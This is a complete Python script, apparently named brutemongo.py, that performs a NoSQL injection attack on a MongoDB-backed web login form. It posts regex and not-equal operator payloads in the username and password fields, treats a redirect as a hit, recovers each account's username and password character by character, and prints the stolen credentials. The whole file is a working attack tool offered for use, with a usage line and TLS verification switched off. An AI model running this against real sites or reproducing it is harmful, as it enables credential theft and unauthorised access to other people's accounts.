import requests
import urllib3
import string
import urllib
import sys
import os
urllib3.disable_warnings()
clear = lambda: os.system('clear')

users = {}
if len(sys.argv) < 4:
    print("python brutemongo.py <User Field> <Password Field> <URL>")
    sys.exit(255)
userField=sys.argv[1]
passField=sys.argv[2]
url=sys.argv[3]
headers={'content-type': 'application/x-www-form-urlencoded'}

def findUsernames():
    username = ""
    while True:
        hit = False
        for c in string.printable:
            special = False
            if c in ['*','+','.','?','|', '$', '^', '#']:
                orig = c
                c = "\\" + c
                special = True
            payload='username[$regex]=^%s&password[$ne]=nopes' % (urllib.quote_plus(username + c))
            clear()
            print("Scouting Username: " + username + c)
            r = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302:
                ex = False
                if username == "":
                    for user in users.keys():
                        if c == user[0]:
                            ex = True
                if ex:
                    continue
                if special:
                    c = orig
                username += c
                hit = True
        if not hit:
            if username == "":
                break
            else:
                users[username] = {}
                users[username]['password'] = ""
                username = ""
                print ("FOUND!")


def findPasswords():
    for user in users.keys():
        password = ""
        while True:
            hit = False
            for c in string.printable:
                special = False
                if c in ['*','+','.','?','|', '$', '^', '#']:
                    orig = c
                    c = "\\" + c
                    special = True
                payload='username=%s&password[$regex]=^%s' % (urllib.quote_plus(user), urllib.quote_plus(password + c))
                clear()
                print("Username: " + user +" Password: " + password + c)
                r = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
                if r.status_code == 302:
                    if special:
                        c = orig
                    password += c
                    hit = True
            if not hit:
                users[user]['password'] = password
                break


def printOut():
    for user in users.keys():
        print("Username: %s Password: %s" % (user, users[user]['password']))


findUsernames()
findPasswords()
clear()
print("Found Credentials")
print("--------------------")
printOut()
